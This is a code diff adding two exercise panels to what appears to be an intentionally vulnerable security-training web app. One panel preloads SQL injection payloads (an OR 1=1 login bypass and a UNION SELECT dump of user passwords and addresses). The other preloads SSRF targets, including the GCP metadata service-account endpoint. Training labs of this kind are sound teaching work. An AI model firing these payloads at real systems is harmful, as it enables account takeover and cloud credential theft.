@@ -508,6 +508,152 @@ function AdminUsersLab() {
   );
 }
 
+function SqliLoginLab() {
+  const { busy, result, error, run } = useLabAction();
+  const [email, setEmail] = useState("' OR 1=1--");
+  const [password, setPassword] = useState("x");
+  return (
+    <div className="space-y-3">
+      <p className="text-xs text-ocean-600 leading-relaxed">
+        Accounts are in SQLite. Login interpolates email + password hash into SQL.
+      </p>
+      <div className="flex flex-wrap gap-2">
+        <button
+          type="button"
+          className="btn-secondary text-xs"
+          onClick={() => {
+            setEmail("jordan.lee@example.com");
+            setPassword("jordanwaves");
+          }}
+        >
+          Normal login
+        </button>
+        <button
+          type="button"
+          className="btn-secondary text-xs"
+          onClick={() => {
+            setEmail("' OR 1=1--");
+            setPassword("x");
+          }}
+        >
+          Bypass OR 1=1
+        </button>
+        <button
+          type="button"
+          className="btn-secondary text-xs"
+          onClick={() => {
+            setEmail(
+              "' UNION SELECT email,name,role,demo_password,saved_shipping_address FROM users--"
+            );
+            setPassword("x");
+          }}
+        >
+          UNION dump
+        </button>
+      </div>
+      <label className="block text-sm">
+        <span className="text-ocean-700 font-medium">Email</span>
+        <input
+          value={email}
+          onChange={(e) => setEmail(e.target.value)}
+          className="mt-1 w-full rounded-lg border border-ocean-200 px-3 py-2 text-sm font-mono"
+        />
+      </label>
+      <label className="block text-sm">
+        <span className="text-ocean-700 font-medium">Password</span>
+        <input
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          className="mt-1 w-full rounded-lg border border-ocean-200 px-3 py-2 text-sm font-mono"
+        />
+      </label>
+      <button
+        type="button"
+        disabled={busy}
+        className="btn-primary text-sm"
+        onClick={() =>
+          run(async () => {
+            const res = await fetch("/api/auth/login", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ email, password }),
+            });
+            return { status: res.status, body: await res.json() };
+          })
+        }
+      >
+        {busy ? "Submitting…" : "POST /api/auth/login"}
+      </button>
+      {error && <p className="text-sm text-coral-700">{error}</p>}
+      <Result data={result} />
+    </div>
+  );
+}
+
+function SsrfFetchLab() {
+  const { busy, result, error, run } = useLabAction();
+  const [url, setUrl] = useState("http://chat-rag:8001/health");
+  return (
+    <div className="space-y-3">
+      <p className="text-xs text-ocean-600 leading-relaxed">
+        Media import fetches whatever URL you give — from the chat-rag pod network.
+      </p>
+      <div className="flex flex-wrap gap-2">
+        <button
+          type="button"
+          className="btn-secondary text-xs"
+          onClick={() => setUrl("https://example.com")}
+        >
+          example.com
+        </button>
+        <button
+          type="button"
+          className="btn-secondary text-xs"
+          onClick={() => setUrl("http://chat-rag:8001/health")}
+        >
+          Internal health
+        </button>
+        <button
+          type="button"
+          className="btn-secondary text-xs"
+          onClick={() =>
+            setUrl("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/")
+          }
+        >
+          GCP metadata IP
+        </button>
+      </div>
+      <label className="block text-sm">
+        <span className="text-ocean-700 font-medium">URL</span>
+        <input
+          value={url}
+          onChange={(e) => setUrl(e.target.value)}
+          className="mt-1 w-full rounded-lg border border-ocean-200 px-3 py-2 text-sm font-mono"
+        />
+      </label>
+      <button
+        type="button"
+        disabled={busy}
+        className="btn-primary text-sm"
+        onClick={() =>
+          run(async () => {
+            const res = await fetch("/api/media/fetch", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ url }),
+            });
+            return { status: res.status, body: await res.json() };
+          })
+        }
+      >
+        {busy ? "Fetching…" : "Fetch URL"}
+      </button>
+      {error && <p className="text-sm text-coral-700">{error}</p>}
+      <Result data={result} />
+    </div>
+  );
+}
+
 export default function LabInteractionPanel({
   interaction,
 }: {
@@ -523,6 +669,10 @@ export default function LabInteractionPanel({
     case "login":
     case "session-forge":
       return <LoginLab />;
+    case "sqli-login":
+      return <SqliLoginLab />;
+    case "ssrf-fetch":
+      return <SsrfFetchLab />;
     case "maya-chat":
       return <MayaChatLab />;
     case "community-tip":
